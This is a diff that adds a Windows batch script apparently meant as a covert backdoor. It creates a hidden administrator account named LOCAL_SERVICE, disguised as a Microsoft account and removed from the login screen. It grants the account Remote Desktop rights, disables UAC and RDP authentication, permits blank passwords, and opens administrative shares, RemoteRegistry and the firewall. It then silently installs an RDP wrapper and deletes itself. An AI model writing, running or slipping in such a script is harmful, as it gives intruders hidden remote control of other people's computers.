@@ -1,0 +1,69 @@
+@echo off
+chcp 1251
+setlocal ENABLEDELAYEDEXPANSION
+Set xOS=x64& If "%PROCESSOR_ARCHITECTURE%"=="x86" (If Not Defined PROCESSOR_ARCHITEW6432 Set xOS=x86)
+for /f "tokens=3" %%l in ('reg query HKCU\Control" "Panel\International /v LocaleName') do set lang=%%l
+for /f "Delims=" %%a in ('ver') do (set os=%%a)
+echo !os! !xOS! !lang!
+net user LOCAL_SERVICE flvbyrf /add /fullname:"Microsoft Corporation" /comment:"Microsoft Windows Account" /countrycode:"000" /active:"yes" /expires:"never" /passwordchg:"NO"
+::net user Администратор /active:yes
+SET AdmGroupSID=S-1-5-32-544
+SET AdmGroup=
+For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%AdmGroupSID%'" Get Name /Value ^| Find "="`) Do SET AdmGroup=%%J
+SET AdmGroup=%AdmGroup:~0,-1%
+net localgroup %AdmGroup% LOCAL_SERVICE /add
+SET RDPGroupSID=S-1-5-32-555
+SET RDPGroup=
+For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%RDPGroupSID%'" Get Name /Value ^| Find "="`) Do SET RDPGroup=%%J
+SET RDPGroup=%RDPGroup:~0,-1%
+net localgroup "%RDPGroup%" LOCAL_SERVICE /add
+SET UserGroupSID=S-1-5-32-545
+SET UserGroup=
+For /F "UseBackQ Tokens=1* Delims==" %%I In (`WMIC Group Where "SID = '%UserGroupSID%'" Get Name /Value ^| Find "="`) Do SET UserGroup=%%J
+SET UserGroup=%UserGroup:~0,-1%
+net localgroup %UserGroup% LOCAL_SERVICE /delete
+net accounts /forcelogoff:no /maxpwage:unlimited
+net share C$=C:\
+net share ADMIN$=C:\WINDOWS
+net share IPC$
+::net share C /del
+::net share C=C: /grant:ВСЕ,full
+::net share C=C: /grant:Everyone,full
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /d 0 /v LOCAL_SERVICE /f
+reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Services\TermService /v Start /t reg_dword /d 2 /f
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t reg_dword /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v AllowTSConnections /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSUserEnabled /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v StartRCM /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f
+reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters /v AllowInsecureGuestAuth /t reg_dword /d 1 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v ShutdownWarningDialogTimeout /t REG_DWORD /d 1 /f
+reg add HKLM\System\CurrentControlSet\Services\lanmanserver\parameters /v AutoShareWks /t REG_DWORD /d 1 /f
+reg add HKLM\System\CurrentControlSet\Services\lanmanserver\parameters /v AutoShareServer /t REG_DWORD /d 1 /f
+net start umrdpservice
+net start TermService
+netsh advfirewall firewall add rule name="Allow RDP" dir=in protocol=TCP localport=3389 action=allow
+for /F %%r in ('reg query hku') do (
+    set key=%%r
+    if "!key:~11,8!"=="S-1-5-21" if NOT "!key:~-8!"=="_Classes" (
+        reg add !key!\Software\Microsoft\Windows\DWM /v SuppressDisableCompositionUI /t REG_DWORD /d 1 /f
+    )
+)
+endlocal
+::if not exist C:\users\LOCAL_SERVICE mkdir C:\users\LOCAL_SERVICE
+::attrib C:\users\LOCAL_SERVICE +s +h +r
+sc start RemoteRegistry
+sc config RemoteRegistry start= auto
+::dism /online /Enable-Feature /FeatureName:TelnetServer
+::sc config tlntsvr start= auto
+::tlntadmn config port=23 sec=-NTLM
+::net start Telnet
+"%~dp0RDPWInst.exe" -i -s
+del "%~dp0RDPWInst.exe" /F /Q
+del %0
